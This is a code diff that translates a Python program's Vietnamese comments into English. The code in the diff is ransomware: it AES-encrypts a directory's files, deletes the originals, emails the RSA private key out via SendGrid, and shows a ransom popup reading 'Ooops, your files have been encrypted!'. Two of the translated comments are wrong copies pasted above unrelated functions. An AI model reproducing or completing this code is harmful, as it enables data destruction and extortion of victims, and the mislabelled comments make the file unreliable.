@@ -12,19 +12,19 @@ from sendgrid.helpers.mail import Mail
 from datetime import datetime
 import base64
 
-# Mã hóa dữ liệu với AES
+# Encrypt data with AES
 def encrypt_with_aes(data, aes_key, aes_iv):
     cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
     encryptor = cipher.encryptor()
     return encryptor.update(data) + encryptor.finalize()
 
-# Giải mã dữ liệu với AES
+# Decrypt data with AES
 def decrypt_with_aes(encrypted_data, aes_key, aes_iv):
     cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
     decryptor = cipher.decryptor()
     return decryptor.update(encrypted_data) + decryptor.finalize()
 
-# Mã hóa khóa AES với RSA public key
+# Encrypt AES key with RSA public key
 def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
     encrypted_key = rsa_public_key.encrypt(
         aes_key,
@@ -36,7 +36,7 @@ def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
     )
     return encrypted_key
 
-# Giải mã khóa AES với RSA private key
+# Decrypt AES key with RSA private key
 def decrypt_aes_key_with_rsa(encrypted_aes_key, private_key):
     decrypted_key = private_key.decrypt(
         encrypted_aes_key,
@@ -48,7 +48,7 @@ def decrypt_aes_key_with_rsa(encrypted_aes_key, private_key):
     )
     return decrypted_key
 
-# Mã hóa và thêm phần mở rộng ".aes"
+# Encrypt and add ".aes" extension
 def encrypt_files_in_directory(directory_path, aes_key, aes_iv):
     files = glob.glob(os.path.join(directory_path, '*'))
     for file_path in files:
@@ -62,7 +62,7 @@ def encrypt_files_in_directory(directory_path, aes_key, aes_iv):
             os.remove(file_path)
             print(f"Encrypted and removed: {file_path}")
 
-# Giải mã các tệp trong thư mục và bỏ đuôi ".aes"
+# Decrypt the files in the directory and remove the ".aes" extension
 def decrypt_files_in_directory(directory_path, aes_key, aes_iv):
     files = glob.glob(os.path.join(directory_path, '*.aes'))
     for file_path in files:
@@ -75,8 +75,7 @@ def decrypt_files_in_directory(directory_path, aes_key, aes_iv):
                 df.write(decrypted_data)
             os.remove(file_path)
             print(f"Decrypted and removed: {file_path}")
-
-# Gửi private key qua email
+# Decrypt the files in the directory and remove the ".aes" extension
 def send_private_key_via_email(private_key, encrypted_aes_key, aes_iv):
     pem_private_key = private_key.private_bytes(
         encoding=serialization.Encoding.PEM,
@@ -100,7 +99,6 @@ def send_private_key_via_email(private_key, encrypted_aes_key, aes_iv):
     except Exception as e:
         print(str(e))
 
-# Khi nhấn nút "Decrypt"
 def decrypt_files():
     window = tk.Toplevel()
     window.title("Enter your private key")
@@ -137,7 +135,7 @@ def decrypt_files():
     btn_submit = tk.Button(window, text="Submit", font=("Helvetica", 14), bg="#ffcc00", fg="black", command=submit_key)
     btn_submit.pack(pady=20)
 
-# Hàm chính để mã hóa tệp và gửi private key qua email
+# Main function to encrypt files and send private key via email
 def encrypt_and_notify():
     aes_key = os.urandom(32)  # AES-256 key
     aes_iv = os.urandom(16)   # AES IV
@@ -155,11 +153,11 @@ def encrypt_and_notify():
     send_private_key_via_email(private_key, encrypted_aes_key, aes_iv)
     ransom_popup()
 
-# Lấy thời gian hiện tại
+# Main function to encrypt files and send private key via email
 def get_current_time():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-# Popup thông báo tiền chuộc
+# Ransom notification popup
 def ransom_popup():
     window = tk.Tk()
     window.title("Ooops, your files have been encrypted!")
